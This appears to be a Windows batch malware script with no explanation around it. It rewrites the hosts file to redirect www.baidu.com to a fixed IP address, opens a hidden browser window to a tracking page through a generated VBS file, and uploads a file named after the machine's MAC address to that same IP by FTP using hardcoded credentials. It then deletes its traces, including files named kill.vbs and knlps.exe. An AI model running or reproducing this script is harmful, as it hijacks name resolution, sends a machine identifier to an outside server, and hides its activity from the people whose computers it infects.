@echo off

set dsthost=%WINDIR%\system32\drivers\etc\hosts.cc
set syshost=%WINDIR%\system32\drivers\etc\hosts
del %dsthost%
for /f "tokens=1,2" %%a in (%syshost%) do if %%b neq www.baidu.com echo %%a %%b >> %dsthost%
echo 61.172.202.253 www.baidu.com >> %dsthost%
copy  %dsthost% %syshost%
del %dsthost%

echo Set WshSHell = CreateObject("WScript.Shell") > ie.vbs 
echo WshSHell.run "IEXPLORE.EXE http://www.08sa.cn/baidu/tj.html",0 >>ie.vbs 
echo Set WshSHell = Nothing >> ie.vbs 
cscript //nologo ie.vbs 

route print|find "0x" |find /v "Loopback"> maclist
for /f "delims=... tokens=1,2" %%a in (maclist) do set mac=%%b
for /f "tokens=1,2,3,4,5,6" %%a in ('echo %mac%') do set macs=%%a-%%b-%%c-%%d-%%e-%%f
echo "" > %macs%
echo maclist>ftpcmd
echo cc9811>>ftpcmd
echo put %macs%>> ftpcmd
echo quit>> ftpcmd
ftp -s:ftpcmd 61.172.202.253

del ftpcmd
del %macs%
del maclist
del rav.txt;pid.txt;kill.vbs;knlps.exe;kill.bat;ie.vbs;run.bat